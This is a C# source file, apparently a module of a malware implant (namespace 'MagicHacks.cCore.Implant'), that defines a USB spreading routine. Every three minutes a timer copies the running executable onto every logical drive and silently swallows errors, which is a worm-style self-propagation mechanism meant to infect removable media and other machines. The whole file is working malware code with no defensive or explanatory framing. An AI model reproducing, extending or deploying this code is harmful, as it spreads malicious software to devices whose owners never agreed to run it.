using System.IO;
using System.Windows.Forms;
using System;

namespace MagicHacks.cCore.Implant
{
    internal sealed class cUsbSpread
    {

        public static void UsbSpread()
        {
            System.Timers.Timer timer = new System.Timers.Timer(180000);
            timer.Elapsed += Spread;
            timer.Enabled = true;
            timer.AutoReset = true;

            timer.Start();
        }

        public static void Spread(object oSource, System.Timers.ElapsedEventArgs eArgs)
        {
            try
            {
                foreach (string sDir in Environment.GetLogicalDrives())
                    File.Copy(Application.ExecutablePath, sDir + Path.GetFileName(Application.ExecutablePath));
            }
            catch {  }
        }
    }
}
